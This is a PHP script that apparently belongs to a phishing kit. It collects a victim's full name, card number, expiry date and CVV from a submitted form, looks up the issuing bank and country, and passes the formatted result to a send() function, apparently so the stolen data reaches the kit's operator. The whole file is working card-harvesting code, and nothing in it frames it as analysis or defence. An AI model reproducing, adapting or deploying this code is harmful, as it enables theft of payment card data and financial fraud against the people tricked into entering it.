<?php
	@require_once('../function.php');
	@require_once('../bin.php');
	$dedai = bin::getbank(str_replace(' ','',$_POST['mcard']));

	$msg =  "<strong>🔥 Created BY @rootinabox 🔥</strong>\n \n".
	"<strong>‼️💲 Card Bank 💲‼️</strong>\n".
	"<strong> 🌐 IP:  ".$ip."</strong>\n".
	"<strong></strong>\n".
	"<strong>🏦💲 Bank INFO 💲🏦</strong>\n".
	"<strong> 🏦 Bank : </strong><code>".$dedai[0]."</code>\n".
	"<strong> 🏦 Brand : </strong><code>".$dedai[1]."</code>\n".
	"<strong> 🏦 type : </strong><code>".$dedai[2]."</code>\n".
	"<strong> 🏦 Country : </strong><code>".$dedai[3]."</code>\n".
	"<strong></strong>\n".
	"<strong>Card Detail :</strong>\n".
	"<strong> fullname : </strong><code>" . $_POST['mname']."</code>\n".
	"<strong> card : </strong><code>". str_replace(' ','',$_POST['mcard']) ."</code>\n".
	"<strong> date : </strong><code>".$_POST['mdate']."</code>\n".
	"<strong> cvv : </strong><code>".$_POST['mcvv']."</code>\n";
	"<strong></strong>\n".
	"<strong>‼️💲 Card Bank 💲‼️</strong>\n".
	"<strong>🔥 Created BY @rootinabox 🔥</strong>\n \n";
	send($msg);

?>